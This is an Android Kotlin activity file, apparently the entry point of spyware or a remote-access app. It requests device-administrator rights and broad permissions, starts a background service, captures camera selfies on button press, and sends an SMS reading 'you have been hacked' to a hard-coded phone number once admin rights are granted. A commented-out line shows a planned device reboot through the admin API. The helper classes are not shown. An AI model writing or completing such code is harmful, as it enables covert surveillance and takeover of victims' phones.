package com.example.betryalcommit
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    companion object {
        const val PERMISSION_REQUEST_CODE = 1
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        AdminAct.initialize(this);
        val serviceIntent = Intent(this, MyService::class.java)
        startService(serviceIntent)
        val btn = findViewById<Button>(R.id.chk)
        val btn2 = findViewById<Button>(R.id.chk2);

        var devicePolicyManager =
            getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        var componentName = ComponentName(this, MyAdminReceiver::class.java)
        val btn3 = findViewById<Button>(R.id.chk3)
        startService(Intent(this, MyService::class.java))


        btn.setOnClickListener {
            Permsu.requestPermissions(
                applicationContext,
                this,
                PERMISSION_REQUEST_CODE
            )
            AdminAct.admact(this);
        }
        btn2.setOnClickListener {
//                intent = Intent(this,MyService::class.java)
//                ContextCompat.startForegroundService(this, intent)
//            dpm.reboot(MyAdminReceiver::class.java)

        }
        btn3.setOnClickListener {
          val cam =   CameraCaptureHelper()
            cam.captureCameraSelfie(this);
        }
    }

    private fun done() {
        if (AdminAct.isDeviceAdminAssigned()) {
            Toast.makeText(applicationContext, "hello bro", Toast.LENGTH_SHORT).show()
            Teleserv.sendMessage(this,"9545086924","20:30 you have been hacked");
        }
    }
}
